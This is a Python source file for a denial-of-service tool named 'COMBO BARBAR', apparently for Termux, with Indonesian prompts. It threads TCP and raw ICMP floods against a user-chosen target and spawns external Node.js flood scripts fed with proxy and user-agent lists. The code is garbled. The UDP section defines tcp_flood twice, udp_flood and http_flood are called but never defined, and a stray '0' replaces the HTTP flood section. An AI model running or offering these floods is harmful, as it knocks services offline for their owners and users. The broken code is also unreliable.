import socket
import threading
import random
import time
import requests
import sys
import subprocess
import os
from urllib.parse import urlparse

# === WARNA TERMUX ===
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
C = "\033[96m"
B = "\033[94m"
W = "\033[0m"

# === LOAD PROXY & USER-AGENTS ===
def load_proxies():
    try:
        with open("proxy.txt") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        print(f"{R}[ERROR]{W} proxy.txt tidak ditemukan atau kosong!")
        return []

def load_user_agents():
    try:
        with open("ua.txt") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        print(f"{R}[ERROR]{W} ua.txt tidak ditemukan! Menggunakan default UA...")
        return [
            "Mozilla/5.0", "Chrome/90.0", "Safari/537.36",
            "Opera/9.80", "Edge/91.0"
        ]

# === AUTO RESOLVE IP ===
def resolve_ip(target):
    try:
        hostname = urlparse(target).hostname if target.startswith("http") else target
        return socket.gethostbyname(hostname)
    except Exception as e:
        print(f"{R}[RESOLVE ERROR]{W} {e}")
        sys.exit(1)

# === LAYER 3: UDP FLOOD ===
def tcp_flood(ip, port, times, threads):
    data = random._urandom(1024)
    
    def attack():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                for _ in range(times):
                    s.send(data)
                print(f"{R}[TCP]{W} Sent to {ip}:{port}")
                s.close()
            except:
                print(f"{R}[TCP]{W} Failed to connect")

    for _ in range(threads):
        t = threading.Thread(target=attack)
        t.start()

# === LAYER 4: TCP FLOOD ===
import threading
import socket
import time
import random

def tcp_flood(ip, port, duration, threads=100):
    timeout = time.time() + duration

    def attack():
        while time.time() < timeout:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ip, port))
                s.send(random._urandom(2048))
                s.close()
                print(f"{C}[TCP]{W} Flooded {ip}:{port}")
            except Exception as e:
                print(f"{R}[TCP ERROR]{W} {e}")

    for _ in range(threads):
        t = threading.Thread(target=attack)
        t.start()
# === LAYER 7: HTTP GET FLOOD ===
0
# === PING FLOOD (ICMP) ===
import socket
import time
import struct
import random

def checksum(data):
    res = 0
    for i in range(0, len(data)-1, 2):
        res += (data[i] << 8) + data[i+1]
    if len(data) % 2:
        res += data[-1] << 8
    while res >> 16:
        res = (res & 0xFFFF) + (res >> 16)
    return ~res & 0xFFFF

def ping_flood(ip, duration):
    timeout = time.time() + duration
    icmp_type = 8
    icmp_code = 0
    identifier = random.randint(0, 65535)
    seq_number = 1

    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            header = struct.pack("!BBHHH", icmp_type, icmp_code, 0, identifier, seq_number)
            payload = b'PingFlood' + random._urandom(48)
            chksum = checksum(header + payload)
            header = struct.pack("!BBHHH", icmp_type, icmp_code, chksum, identifier, seq_number)
            packet = header + payload

            sock.sendto(packet, (ip, 0))
            print(f"{B}[PING]{W} ICMP sent to {ip}")
            sock.close()
            seq_number += 1
        except Exception as e:
            print(f"{R}[PING ERROR]{W} {e}")
# === LAUNCH NODE.JS SCRIPTS ===
def launch_node_scripts(target, port, duration, threads):
    node_scripts = [
        ["coll.js", target, str(duration), str(port)],
        ["col.js", target, str(duration), str(threads), str(threads), "proxy.txt"],
        ["colll.js", target, str(duration), str(threads), str(threads), "proxy.txt"],
        ["collll.js", target, str(duration), str(threads), str(threads), "proxy.txt"]
    ]
    for script in node_scripts:
        try:
            print(f"{G}[NODE]{W} Menjalankan {script[0]}...")
            subprocess.Popen(["node"] + script)
        except Exception as e:
            print(f"{R}[{script[0]} ERROR]{W} {e}")

# === COMBO ATTACK ===
def combo_attack(target, port, duration, threads):
    ip = resolve_ip(target)
    proxy_list = load_proxies()
    ua_list = load_user_agents()
    print(f"{G}[COMBO]{W} Menyerang {target} (IP: {ip})")
    for _ in range(threads):
        threading.Thread(target=udp_flood, args=(ip, port, duration)).start()
        threading.Thread(target=tcp_flood, args=(ip, port, duration)).start()
        threading.Thread(target=http_flood, args=(target, proxy_list, ua_list, duration)).start()
        threading.Thread(target=ping_flood, args=(ip, duration)).start()
    launch_node_scripts(target, port, duration, threads)

# === MENU UTAMA ===
def menu():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"""{G}
    ⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⣿⣿⣿⣶⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣟⣿⡏⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⠟⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣇⡀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢿⣿⣿⣟⣃⡤⠤⠿⠿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣴⡶⠦⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⠟⠁⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⡆⠀⢿⣿⠁⠀⠀⠈⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⠯⠀⢠⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣧⠀⣿⡏⠀⠀⠀⢠⡀⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⠀⠀⠘⡆⠀⣰⣿⣿⣿⣿⣿⣿⣿⣜⣷⣿⠁⠀⠀⠀⢸⡇⣸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢻⠀⠀⠘⣿⢠⣿⣿⣿⣿⣿⣿⣟⠿⢿⠛⠁⠓⠆⠀⠀⣼⠁⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⡄⠀⠀⣾⣾⣷⣿⣿⣿⠿⢿⣿⣶⣾⣶⣶⣾⣷⣶⣶⣿⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡇⠀⠀⢹⣇⣾⣿⢿⡟⠀⠸⣿⡄⢹⡁⠀⠀⠀⠀⠈⢹⢰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡇⠀⠀⢸⣿⡟⠉⠘⣇⠀⠀⠉⠙⠺⡇⠀⠀⠀⠀⡓⠘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣷⠀⠀⣼⡿⠧⠒⠒⠛⠛⠒⣶⢤⣄⣳⡀⣀⣀⡤⠥⠤⠬⢷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣾⡤⠞⠉⠀⠀⠀⠀⠀⠀⠀⠀⠁⢹⣿⣿⡿⠑⠀⠀⠀⠀⠀⠈⠙⠓⠢⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢰⢋⣷⠊⠀⠀⠴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⣌⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣯⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢻⡤⢄⡀⠀⠀⠀⠀⠀⠀⠀
⢠⡴⢻⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣗⡇⠀⠀⠀⠀⠀⠀⠀
⠈⣷⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⠀⠀⠀
⠈⢿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣇⠀⠀⠀⠀⠀⠀⠀
⠀⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⠀⠀⠀
⠀⢹⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣷⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠀⠀⠀⠀⠀⠀⠀
⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡾⣿⣿⣿⡟⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠇⠀⠀⠀⠀⠀⠀⠀
⠀⢀⡷⠖⠒⠲⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠚⢁⣢⣿⡿⡿⣇⠈⠙⠢⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢞⡞⠀⠀⠀⣀⣀⡀⠀⠀
⢠⠞⠀⠀⠀⠀⠀⠹⣶⢤⡀⠀⠀⠀⠀⠀⠀⣸⡇⠀⠀⠀⠈⡇⢀⠔⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠀⢀⡴⠊⠁⠀⠈⢦⡀
⡞⠀⠀⠀⠀⠀⠀⠀⠙⠳⣽⣷⡀⠀⠀⠀⠀⣿⠇⠀⠀⠀⠀⡇⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⢷⣶⡿⠀⠀⠀⠀⠀⠀⢧
⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⢦⡀⠀⢠⢿⠀⠀⠀⠀⠀⢧⠈⠀⠀⠀⠀⣀⡤⠤⠤⠤⣴⣻⣳⠋⠀⠀⠀⠀⠀⠀⠀⠀⣾
⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣧⣏⡇⢹⡀⣸⡏⠀⠀⠀⠀⠀⠘⡆⠀⠀⣰⠋⠁⠀⠀⠀⢰⣳⣧⡇⠀⡆⠀⠀⠀⠀⠀⠀⢀⡟
⠘⣆⠀⠀⠀⠀⠀⠀⣄⢧⣾⣿⣿⠁⠀⢷⡿⠀⠀⠀⠀⠀⠀⠀⢱⠀⡴⠃⠀⠀⠀⠀⠀⣾⣿⢧⣧⠀⡇⢰⠀⠀⠀⠀⠀⣼⠃
⠀⠸⡄⠀⠀⠀⠀⠀⠈⣿⣿⡽⠃⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⢸⢸⠁⠀⠀⠀⠀⠀⠀⠻⣿⣮⣿⣷⡇⠀⡄⠀⠀⠀⣔⡏⠀
⠀⢰⠻⡄⠀⠀⠀⠀⠀⢹⣏⡄⠀⠀⢠⣿⠁⠀⠀⠀⠀⠀⠀⠀⠸⡌⠒⠀⠀⠀⠀⠀⠀⠀⢘⣻⣿⡟⠁⡀⠀⠀⠀⠀⠙⡇⠀
⠀⡼⠰⢿⠀⠀⠀⠀⠀⠈⠛⣶⣦⣀⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠲⢤⣀⣠⠤⠴⠚⠉⠀⡼⠁⠀⠁⠀⠀⠀⠀⠀⢹⠀
⠀⡇⠀⠈⠀⠀⡀⠀⠀⠀⠀⠹⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠁⠀⠀⠀⠀⢠⠀⠀⠀⢸⠀
⠀⢧⠀⠀⠀⠀⠹⢤⡀⠀⠀⠀⣻⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⢲⠇⠀⠀⠀⠀⠀⠞⠀⠀⠀⣸⠀
⠀⠈⠳⠤⣀⣀⣀⣀⡤⠤⠤⠤⠵⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠯⢤⣀⣀⣀⡤⠤⠤⠤⠤⠴⠏⠀
{W}    COMBO BARBAR TOOL - Termux Version

{Y}[0]{W} COMBO BARBAR
{Y}[1]{W} UDP FLOOD
{Y}[2]{W} TCP FLOOD
{Y}[3]{W} HTTP FLOOD
{Y}[4]{W} PING FLOOD
{Y}[99]{W} EXIT
""")
    mode = input(f"{C}Pilih mode:{W} ")

    if mode == "0":
        target = input("Target URL/IP: ")
        port = int(input("Port: "))
        duration = int(input("Durasi (detik): "))
        threads = int(input("Threads: "))
        combo_attack(target, port, duration, threads)
        input(f"{G}Selesai! Tekan Enter untuk kembali ke menu...{W}")
        menu()

    elif mode in ["1", "2"]:
        target = input("Target IP/Hostname: ")
        ip = resolve_ip(target)
        port = int(input("Port: "))
        duration = int(input("Durasi (detik): "))
        threads = int(input("Threads: "))
        for _ in range(threads):
            if mode == "1":
                threading.Thread(target=udp_flood, args=(ip, port, duration)).start()
            else:
                threading.Thread(target=tcp_flood, args=(ip, port, duration)).start()
        launch_node_scripts(target, port, duration, threads)
        input(f"{G}Selesai! Tekan Enter untuk kembali ke menu...{W}")
        menu()

    elif mode == "3":
        url = input("URL (http/https): ")
        duration = int(input("Durasi (detik): "))
        threads = int(input("Threads: "))
        proxy_list = load_proxies()
        ua_list = load_user_agents()
        for _ in range(threads):
            threading.Thread(target=http_flood, args=(url, proxy_list, ua_list, duration)).start()
        parsed_port = 443 if url.startswith("https://") else 80
        launch_node_scripts(url, parsed_port, duration, threads)
        input(f"{G}Selesai! Tekan Enter untuk kembali ke menu...{W}")
        menu()

    elif mode == "4":
        target = input("Target IP/Hostname: ")
        ip = resolve_ip(target)
        duration = int(input("Durasi (detik): "))
        threads = int(input("Threads: "))
        for _ in range(threads):
            threading.Thread(target=ping_flood, args=(ip, duration)).start()
        launch_node_scripts(target, 80, duration, threads)
        input(f"{G}Selesai! Tekan Enter untuk kembali ke menu...{W}")
        menu()

    elif mode == "99":
        print(f"{Y}[EXIT]{W} Terima kasih telah menggunakan tools ini.")
        sys.exit()

    else:
        print(f"{R}[!] Pilihan tidak valid!{W}")
        time.sleep(1)
        menu()

# === RUN PROGRAM ===
if __name__ == "__main__":
    menu()